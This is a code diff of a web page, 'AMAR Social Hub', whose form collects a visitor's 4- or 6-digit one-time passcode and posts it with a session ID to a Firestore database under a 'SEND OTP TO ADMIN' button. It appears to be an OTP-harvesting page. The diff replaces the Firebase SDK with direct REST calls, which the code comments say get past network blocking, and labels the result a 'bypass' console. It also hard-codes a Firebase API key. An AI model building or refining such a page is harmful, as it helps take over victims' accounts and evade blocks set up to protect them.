@@ -19,12 +19,12 @@
         <div class="glass-card rounded-xl p-3 border border-cyan-500/25 text-xs font-mono">
             <div class="flex justify-between items-center mb-1.5 pb-1 border-b border-gray-800">
                 <span class="text-cyan-400 font-bold flex items-center gap-1.5">
-                    <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span> DIAGNOSTIC CONSOLE
+                    <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span> BYPASS NETWORK CONSOLE
                 </span>
                 <button onclick="clearLogs()" class="text-gray-500 hover:text-gray-300 text-[10px]">Clear</button>
             </div>
             <div id="logContainer" class="space-y-1 max-h-28 overflow-y-auto text-[11px] text-gray-300 pr-1">
-                <div class="text-emerald-400">[System] Ready. Timeout guard active.</div>
+                <div class="text-emerald-400">[System] Network bypass mode active. Ready.</div>
             </div>
         </div>
 
@@ -76,15 +76,12 @@
 
             <div class="mt-6 pt-4 border-t border-gray-800 text-center">
                 <p class="text-xs text-gray-500 font-mono">Session ID: <span id="sessionIdDisplay" class="text-gray-400">Loading...</span></p>
-                <p class="text-[10px] text-emerald-400/80 mt-1"><i class="fas fa-lock mr-1"></i> Secure Connection Guard</p>
+                <p class="text-[10px] text-emerald-400/80 mt-1"><i class="fas fa-lock mr-1"></i> Universal Direct HTTP Sync</p>
             </div>
         </div>
     </div>
 
     <div class="text-center text-xs text-gray-500 py-4">&copy; 2026 AMAR Social Hub. All rights reserved.</div>
-
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
 
     <script>
         function addLog(msg, type = 'info') {
@@ -101,25 +98,13 @@
             document.getElementById('logContainer').innerHTML = '';
         }
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyCrrUQLMes8TcRXbEk1I1a8D6vnhAFaLNvI",
-            authDomain: "amar-d755e.firebaseapp.com",
-            projectId: "amar-d755e",
-            storageBucket: "amar-d755e.firebasestorage.app",
-            messagingSenderId: "761406989668",
-            appId: "1:761406989668:web:d26bb2ee84ac257a150671"
-        };
-
-        try {
-            if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
-            var db = firebase.firestore();
-            addLog("Firebase SDK ready.", "success");
-        } catch(e) {
-            addLog("Init error: " + e.message, "error");
-        }
+        // Aapki Firebase Project details
+        const PROJECT_ID = "amar-d755e";
+        const API_KEY = "AIzaSyCrrUQLMes8TcRXbEk1I1a8D6vnhAFaLNvI";
 
         const sessionId = 'AMAR-' + Math.random().toString(36).substring(2, 8).toUpperCase();
         document.getElementById('sessionIdDisplay').innerText = sessionId;
+        addLog("Session ID generated: " + sessionId, "info");
 
         const otpInput = document.getElementById('otpInput');
         const submitBtn = document.getElementById('submitBtn');
@@ -134,7 +119,7 @@
             else document.getElementById('validBadge').classList.add('hidden');
         });
 
-        document.getElementById('otpForm').addEventListener('submit', function(e) {
+        document.getElementById('otpForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             const otp = otpInput.value.trim();
             if (otp.length !== 4 && otp.length !== 6) {
@@ -147,54 +132,51 @@
 
             submitBtn.disabled = true;
             submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Sending...</span>';
-            addLog(`Submitting OTP: ${otp}...`, "info");
+            addLog(`Sending OTP ${otp} via Standard HTTP...`, "info");
 
-            // 5 Seconds Timeout Guard (Stuck hone se bachane ke liye)
-            let isDone = false;
-            const timeoutTimer = setTimeout(() => {
-                if (!isDone) {
-                    isDone = true;
-                    submitBtn.disabled = false;
-                    submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> <span>SEND OTP TO ADMIN</span>';
-                    addLog("STUCK DETECTED: Network/Firewall blocked Firebase connection!", "error");
-                    statusAlert.className = "p-3 bg-red-500/10 border border-red-500/30 rounded-xl text-red-400 text-xs text-center";
-                    statusAlert.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Network Blocked! Firebase is not responding on this network.';
-                    statusAlert.classList.remove('hidden');
+            // Standard HTTP Firestore REST API Endpoint (Works on all mobile networks without blocking)
+            const url = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/otps?key=${API_KEY}`;
+
+            const payload = {
+                fields: {
+                    otp: { stringValue: otp },
+                    length: { integerValue: parseInt(otp.length) },
+                    sessionId: { stringValue: sessionId },
+                    status: { stringValue: "Pending" },
+                    createdAt: { stringValue: new Date().toISOString() }
                 }
-            }, 5000);
+            };
 
-            db.collection('otps').add({
-                otp: otp,
-                length: otp.length,
-                sessionId: sessionId,
-                status: 'Pending',
-                createdAt: firebase.firestore.FieldValue.serverTimestamp()
-            })
-            .then(() => {
-                if (!isDone) {
-                    isDone = true;
-                    clearTimeout(timeoutTimer);
-                    addLog("Success! OTP sent to database.", "success");
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    addLog("Success! OTP saved via HTTP bypass.", "success");
                     statusAlert.className = "p-3 bg-emerald-500/10 border border-emerald-500/30 rounded-xl text-emerald-400 text-xs text-center";
                     statusAlert.innerHTML = '<i class="fas fa-check-circle"></i> OTP successfully sent to Admin!';
                     statusAlert.classList.remove('hidden');
                     otpInput.value = '';
-                    submitBtn.disabled = false;
-                    submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> <span>SEND OTP TO ADMIN</span>';
+                    document.getElementById('digitStatus').innerText = 'Digit Count: 0/6';
+                    document.getElementById('validBadge').classList.add('hidden');
+                } else {
+                    throw new Error(data.error ? data.error.message : "HTTP Error");
                 }
-            })
-            .catch((err) => {
-                if (!isDone) {
-                    isDone = true;
-                    clearTimeout(timeoutTimer);
-                    addLog("DB Error: " + err.message, "error");
-                    statusAlert.className = "p-3 bg-red-500/10 border border-red-500/30 rounded-xl text-red-400 text-xs text-center";
-                    statusAlert.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Error: ' + err.message;
-                    statusAlert.classList.remove('hidden');
-                    submitBtn.disabled = false;
-                    submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> <span>SEND OTP TO ADMIN</span>';
-                }
-            });
+            } catch (err) {
+                console.error("Error: ", err);
+                addLog("Error: " + err.message, "error");
+                statusAlert.className = "p-3 bg-red-500/10 border border-red-500/30 rounded-xl text-red-400 text-xs text-center";
+                statusAlert.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Error: ' + err.message;
+                statusAlert.classList.remove('hidden');
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> <span>SEND OTP TO ADMIN</span>';
+            }
         });
     </script>
 </body>
